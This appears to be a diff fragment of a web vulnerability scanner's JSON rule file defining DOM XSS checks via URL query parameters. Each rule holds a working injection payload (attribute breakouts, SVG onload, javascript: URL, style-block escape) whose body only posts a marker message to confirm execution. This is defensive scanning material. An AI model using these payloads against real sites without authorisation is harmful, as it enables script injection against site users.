-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "\" onerror=\"window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_ATTR_DQ_ERR_%%random%%'},'*')\" x=\"",
-                "operation": "replace"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_attr_single_quote_event",
-          "name": "DOM XSS via query param single-quoted attribute event breakout",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_ATTR_SQ_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "' onmouseover=\"window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_ATTR_SQ_%%random%%'},'*')\" x='",
-                "operation": "replace"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_attr_unquoted_event",
-          "name": "DOM XSS via query param unquoted attribute event injection",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_ATTR_UQ_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "x onmouseover=\"window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_ATTR_UQ_%%random%%'},'*')\"",
-                "operation": "replace"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_tagname_svg_event",
-          "name": "DOM XSS via query param SVG tag-name event injection",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_TAG_SVG_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "svg onload=\"window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_TAG_SVG_%%random%%'},'*')\"",
-                "operation": "replace"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_href_javascript_url",
-          "name": "DOM XSS via query param javascript: URL",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_HREF_JS_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "javascript:window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_HREF_JS_%%random%%'},'*')",
-                "operation": "replace"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_style_text_breakout",
-          "name": "DOM XSS via query param style-block breakout",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_STYLE_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "</style><img src=x onerror=\"window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_STYLE_%%random%%'},'*')\"><style>",
-                "operation": "replace"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
           },
           "condition": {},
           "target": {},
